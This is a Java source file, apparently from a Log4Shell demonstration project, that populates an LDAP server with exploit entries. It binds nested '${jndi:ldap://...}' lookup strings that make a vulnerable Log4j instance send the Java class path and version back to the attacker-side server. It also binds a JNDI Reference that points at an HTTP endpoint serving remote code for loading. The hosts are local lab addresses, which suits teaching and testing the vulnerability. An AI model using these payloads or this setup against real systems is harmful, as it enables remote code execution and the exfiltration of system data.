package com.sonatype.demo.log4shell;



import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.util.HashMap;
import java.util.Hashtable;

public class LdapServerUploader {

    private Context ctx;
    private String ldapserver;
    private String refserver;

    public LdapServerUploader() throws NamingException {

        if(FrontEnd.inDockerContainer) {
            ldapserver="ldap://ldap.dev:1389";
            refserver="http://server.dev:8080";
        }
        else {
            ldapserver="ldap://localhost:1389";
            refserver="http://localhost:8080";

        }
        Hashtable<String, Object> env = new Hashtable<String, Object>();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, ldapserver);
       ctx = new InitialContext(env);



    }


    public void addObjects() throws NamingException {


            HashMap m =  new HashMap<>();


            m.put("key is $${sys:java.version}","${sys:java.version}");
            String dn = "cn=map,dc=example,dc=org";
            ctx.bind(dn, m);

            String x="${sys:java.version}";
            ctx.bind("cn=version,dc=example,dc=org",x);



            ctx.bind("cn=thankyou","thanks for your data");
        ctx.bind("cn=template","${jndi:"+ldapserver+"/server-data/${sys:java.class.path}//${sys:java.version}//ID1}");
        ctx.bind("cn=version","${jndi:"+ldapserver+"/version/${sys:java.version}//ID1}");
        ctx.bind("cn=classpath","${jndi:"+ldapserver+"/classpath/${sys:java.class.path}/}");
        ctx.bind("cn=thankyou","thank you for your data");
        ctx.bind("cn=404","nope - no idea");

        Reference ref = new Reference("ExternalObject","ExternalObject",refserver+"/code/");
        ctx.bind("cn=bogus",ref);
    }
}